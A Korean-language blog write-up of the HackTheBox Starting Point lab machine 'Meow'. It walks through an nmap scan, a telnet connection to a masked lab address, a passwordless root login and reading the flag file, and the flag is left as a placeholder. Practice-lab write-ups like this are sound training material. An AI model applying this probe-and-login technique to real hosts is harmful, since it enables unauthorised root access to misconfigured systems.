---
title: "Meow - Starting Point Tier 0"
date: 2026-03-17
draft: false
categories: ["htb"]
series: ["HTB Starting Point Tier 0"]
difficulty: "Easy"
tags: ["nmap", "telnet", "misconfiguration"]
thumbnail: ""
ctf_name: "HackTheBox"
points: 20
solves: 99999
flag: "FLAG{여기에_실제_플래그}"
---

## Overview

Meow는 HTB Starting Point의 첫 번째 머신으로, Telnet 서비스의 잘못된 설정을 이용해 접근하는 매우 간단한 Linux 머신입니다.

## Enumeration

### Nmap 포트 스캔

```bash
nmap -sV -sC -oN nmap.txt 10.129.x.x
```

결과:

```
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
```

![nmap 결과](1_nmap.png)

Telnet 포트 23번이 열려있는 것을 확인했습니다.

## Exploitation

### Telnet 접속

```bash
telnet 10.129.x.x
```

로그인 프롬프트에서 `root` 로 로그인 시도합니다:

```
Meow login: root
```

비밀번호 없이 root 로그인 성공!

![telnet 접속](2_telnet.png)

### 플래그 획득

```bash
ls
cat flag.txt
```

![플래그](3_flag.png)

## Summary

| 항목 | 내용 |
|------|------|
| 취약점 | Telnet 기본 인증 미설정 |
| 난이도 | Easy |
| 핵심 기술 | Nmap, Telnet |

## Flag

```
FLAG{여기에_실제_플래그}
```
